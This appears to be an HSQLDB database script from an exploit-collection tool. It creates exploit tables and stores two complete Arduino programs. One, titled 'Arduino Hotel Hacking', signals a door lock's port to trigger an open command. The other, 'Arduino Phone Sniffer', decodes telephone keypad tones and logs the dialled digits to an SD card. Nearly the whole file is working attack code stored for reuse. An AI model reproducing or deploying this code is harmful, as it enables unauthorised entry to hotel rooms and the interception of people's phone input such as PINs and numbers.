SET DATABASE UNIQUE NAME HSQLDB3F764116C8
SET DATABASE GC 0
SET DATABASE DEFAULT RESULT MEMORY ROWS 0
SET DATABASE EVENT LOG LEVEL 0
SET DATABASE SQL NAMES FALSE
SET DATABASE SQL REGULAR NAMES TRUE
SET DATABASE SQL REFERENCES FALSE
SET DATABASE SQL SIZE TRUE
SET DATABASE SQL TYPES FALSE
SET DATABASE SQL TDC DELETE TRUE
SET DATABASE SQL TDC UPDATE TRUE
SET DATABASE SQL TRANSLATE TTI TYPES TRUE
SET DATABASE SQL CONCAT NULLS TRUE
SET DATABASE SQL NULLS FIRST TRUE
SET DATABASE SQL UNIQUE NULLS TRUE
SET DATABASE SQL CONVERT TRUNCATE TRUE
SET DATABASE SQL AVG SCALE 0
SET DATABASE SQL DOUBLE NAN TRUE
SET DATABASE SQL LONGVAR IS LOB FALSE
SET DATABASE TRANSACTION CONTROL LOCKS
SET DATABASE DEFAULT ISOLATION LEVEL READ COMMITTED
SET DATABASE TRANSACTION ROLLBACK ON CONFLICT TRUE
SET DATABASE TEXT TABLE DEFAULTS ''
SET FILES WRITE DELAY 0
SET FILES BACKUP INCREMENT TRUE
SET FILES CACHE SIZE 10000
SET FILES CACHE ROWS 50000
SET FILES SCALE 32
SET FILES LOB SCALE 32
SET FILES DEFRAG 0
SET FILES NIO TRUE
SET FILES NIO SIZE 256
SET FILES LOG TRUE
SET FILES LOG SIZE 50
CREATE USER SA PASSWORD DIGEST 'd41d8cd98f00b204e9800998ecf8427e'
ALTER USER SA SET LOCAL TRUE
CREATE SCHEMA PUBLIC AUTHORIZATION DBA
SET SCHEMA PUBLIC
CREATE MEMORY TABLE PUBLIC.PROPERTIES(PROPERTIES_ID BIGINT GENERATED BY DEFAULT AS IDENTITY(START WITH 0) NOT NULL,"NAME" VARCHAR(255),REPLACEVALUE VARCHAR(255),"VALUE" VARCHAR(255),PROPERTIES_EXPLOIT_ID_OID BIGINT,PROPERTIES_INTEGER_IDX INTEGER,CONSTRAINT PROPERTIES_PK PRIMARY KEY(PROPERTIES_ID))
ALTER TABLE PUBLIC.PROPERTIES ALTER COLUMN PROPERTIES_ID RESTART WITH 2
CREATE MEMORY TABLE PUBLIC.EXPLOIT(EXPLOIT_ID BIGINT GENERATED BY DEFAULT AS IDENTITY(START WITH 0) NOT NULL,AUTOR VARCHAR(255),CODE VARCHAR(50000),"DATE" TIMESTAMP,"NAME" VARCHAR(255),PRODUCT VARCHAR(255),CONSTRAINT EXPLOIT_PK PRIMARY KEY(EXPLOIT_ID))
ALTER TABLE PUBLIC.EXPLOIT ALTER COLUMN EXPLOIT_ID RESTART WITH 3
CREATE MEMORY TABLE PUBLIC.DESCRIPTION(DESCRIPTION_ID BIGINT GENERATED BY DEFAULT AS IDENTITY(START WITH 0) NOT NULL,DESCRIPTION VARCHAR(255),LANGUAJE VARCHAR(255),DESCRIPTION_EXPLOIT_ID_OID BIGINT,DESCRIPTION_INTEGER_IDX INTEGER,CONSTRAINT DESCRIPTION_PK PRIMARY KEY(DESCRIPTION_ID),CONSTRAINT DESCRIPTION_FK1 FOREIGN KEY(DESCRIPTION_EXPLOIT_ID_OID) REFERENCES PUBLIC.EXPLOIT(EXPLOIT_ID))
ALTER TABLE PUBLIC.DESCRIPTION ALTER COLUMN DESCRIPTION_ID RESTART WITH 0
ALTER TABLE PUBLIC.PROPERTIES ADD CONSTRAINT PROPERTIES_FK1 FOREIGN KEY(PROPERTIES_EXPLOIT_ID_OID) REFERENCES PUBLIC.EXPLOIT(EXPLOIT_ID)
ALTER SEQUENCE SYSTEM_LOBS.LOB_ID RESTART WITH 1
SET DATABASE DEFAULT INITIAL SCHEMA PUBLIC
GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.YES_OR_NO TO PUBLIC
GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.TIME_STAMP TO PUBLIC
GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.CARDINAL_NUMBER TO PUBLIC
GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.CHARACTER_DATA TO PUBLIC
GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.SQL_IDENTIFIER TO PUBLIC
GRANT DBA TO SA
SET SCHEMA SYSTEM_LOBS
INSERT INTO BLOCKS VALUES(0,2147483647,0)
SET SCHEMA PUBLIC
INSERT INTO PROPERTIES VALUES(1,'file path','<!--file-->','capture.txt',2,2)
INSERT INTO EXPLOIT VALUES(1,'Cody Brocious','#define CONSERVATIVE\u000d\u000dint ioPin = 3;\u000d#define BUFSIZE 200\u000dunsigned char buf[BUFSIZE];\u000d\u000d#define pullLow() pinMode(ioPin, OUTPUT)\u000d#define pullHigh() pinMode(ioPin, INPUT)\u000d\u000dunsigned char dbits[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0};\u000d\u000dunsigned char bits[][144] = {\u000d  {\u000d    0, 0, 0, 0, 0, 0, 0, 0, \u000d    0, 0, 0, 0, 0, 0, 0, 0, \u000d    0, 0, 0, 0, 0, 0, 0, 0, \u000d    0, 0, 0, 0, 0, 0, 0, 0, \u000d    0, 0, 0, 0, 0, 0, 0, 0, \u000d    1, 0, 1, 0, 0, 0, 1, 0, \u000d    0, 1, \u000d\u000d    1, 0, 0, 0, 1, 0, 0, 0, 1, \u000d    1, 0, 1, 0, 0, 1, 0, 1, 1, \u000d    1, 1, 0, 0, 0, 0, 1, 1, 1, \u000d    0, 0, 0, 1, 1, 1, 0, 1, 1,\u000d\u000d    1, 1, 1, 1, 1, 1, 1, 1, \u000d    0, 0, \u000d    0, 0, 0, 0, 0, 0, 0, 0, \u000d    0, 0, 0, 0, 0, 0, 0, 0, \u000d    0, 0, 0, 0, 0, 0, 0, 0, \u000d    0, 0, 0, 0, 0, 0, 0, 0, \u000d    0, 0, 0, 0, 0, 0, 0, 0, \u000d    0, 0, 0, 0, 0, 0, 0, 0\u000d  }, \u000d  {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}, \u000d  {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}, \u000d  {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}, \u000d  {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}, \u000d  {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}, \u000d  {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}, \u000d  {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}, \u000d  {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}, \u000d  {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}, \u000d  {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0}\u000d};\u000d\u000dunsigned char bval;\u000d\u000dvoid wentLow() {\u000d  bval = 1;\u000d}\u000d\u000dvoid setup() {\u000d}\u000d\u000dbool open() {\u000d  pinMode(ioPin, OUTPUT);\u000d  digitalWrite(ioPin, LOW);\u000d  pinMode(ioPin, INPUT);\u000d  digitalWrite(ioPin, LOW);\u000d\u000d  for(int i = 0; i < sizeof(dbits); ++i) {\u000d    if(dbits[i] == 0) {\u000d      pullLow();\u000d      delayMicroseconds(16);\u000d      pullHigh();\u000d      delayMicroseconds(190);\u000d    } else {\u000d      pullLow();\u000d      delayMicroseconds(16);\u000d      pullHigh();\u000d      delayMicroseconds(56);\u000d      pullLow();\u000d      delayMicroseconds(16);\u000d      pullHigh();\u000d      delayMicroseconds(112);\u000d    }\u000d  }\u000d\u000d  pullLow();\u000d  delayMicroseconds(16);\u000d  pullHigh();\u000d\u000d  bval = 0;\u000d  attachInterrupt(1, wentLow, FALLING);\u000d\u000d  unsigned int i = 0;\u000d  while(digitalRead(ioPin) == HIGH && i++ < 32767) {}\u000d  if(i == 32767)\u000d    return false;\u000d\u000d  delayMicroseconds(20);\u000d  for(int i = 0; i < 164; ++i) {\u000d    buf[i] = 0;\u000d    pullLow();\u000d    delayMicroseconds(8);\u000d    pullHigh();\u000d    bval = 0;\u000d    delayMicroseconds(184);\u000d    buf[i] = bval;\u000d  }\u000d\u000d  for(int i = 0; i < 32+3; ++i)\u000d    bits[0][50+i] = buf[22+i];\u000d\u000d  for(int i = 0; i < 8; ++i)\u000d    bits[0][86+i] = bits[0][50+i] ^ bits[0][50+9+i] ^ bits[0][50+18+i] ^ bits[0][50+27+i];\u000d  bits[0][86] ^= 1;\u000d  bits[0][87] ^= 0;\u000d  bits[0][88] ^= 1;\u000d  bits[0][89] ^= 1;\u000d  bits[0][90] ^= 1;\u000d  bits[0][91] ^= 0;\u000d  bits[0][92] ^= 1;\u000d  bits[0][93] ^= 1;\u000d\u000d#ifdef CONSERVATIVE\u000d  delay(100);\u000d#endif\u000d  for(int j = 0; j < 11; ++j) {\u000d    for(int i = 0; i < sizeof(bits[j]); ++i) {\u000d      if(bits[j][i] == 0) {\u000d        pullLow();\u000d        delayMicroseconds(16);\u000d        pullHigh();\u000d        delayMicroseconds(190);\u000d      } else {\u000d        pullLow();\u000d        delayMicroseconds(16);\u000d        pullHigh();\u000d        delayMicroseconds(56);\u000d        pullLow();\u000d        delayMicroseconds(16);\u000d        pullHigh();\u000d        delayMicroseconds(112);\u000d      }\u000d    }\u000d#ifdef CONSERVATIVE\u000d    delayMicroseconds(2700);\u000d#else\u000d    delayMicroseconds(500);\u000d#endif\u000d  }\u000d  return true;\u000d}\u000d\u000dvoid loop() {\u000d    open();\u000d}\u000d','2013-07-08 00:00:00.000000','Arduino Hotel Hacking','UNO')
INSERT INTO EXPLOIT VALUES(2,'Matias Nahuel Heredia && Fulgore1','#include <SD.h> \u000d\u000dFile myFile; \u000dbyte digit; \u000d\u000dvoid setup() \u000d{ \u000d    pinMode(2, INPUT); //D0 \u000d    pinMode(3, INPUT); //D1 \u000d    pinMode(4, INPUT); //D2 \u000d    pinMode(5, INPUT); //D3 \u000d    pinMode(6, INPUT); //DV \u000d    pinMode(10, OUTPUT); //SD Card SS \u000d     \u000d    if (!SD.begin(10)) \u000d    { \u000d        return; \u000d    } \u000d} \u000d\u000dvoid loop() \u000d{ \u000d    while(digitalRead(6) == LOW) \u000d    { \u000d        ; \u000d    } \u000d     \u000d    digit = 0; \u000d     \u000d    if (digitalRead(2) == HIGH) \u000d    { \u000d        digit = digit + 1; \u000d    } \u000d    if (digitalRead(3) == HIGH) \u000d    { \u000d        digit = digit + 2; \u000d    } \u000d    if (digitalRead(4) == HIGH) \u000d    { \u000d        digit = digit + 4; \u000d    } \u000d    if (digitalRead(5) == HIGH) \u000d    { \u000d        digit = digit + 8; \u000d    } \u000d     \u000d    myFile = SD.open("<!--file-->", FILE_WRITE); \u000d     \u000d    if(myFile) \u000d    { \u000d        switch(digit) \u000d        { \u000d            case 10: \u000d                myFile.print("0"); \u000d                break; \u000d                 \u000d            case 11: \u000d                myFile.print("*"); \u000d                break; \u000d                 \u000d            case 12: \u000d                myFile.print("#"); \u000d                break; \u000d                 \u000d            default: \u000d                myFile.print(digit); \u000d        } \u000d         \u000d        myFile.print("-"); \u000d        myFile.close(); \u000d    } \u000d     \u000d    while(digitalRead(6) == HIGH) \u000d    { \u000d        ; \u000d    } \u000d} \u000d','2013-07-08 00:00:00.000000','Arduino Phone Sniffer','UNO')
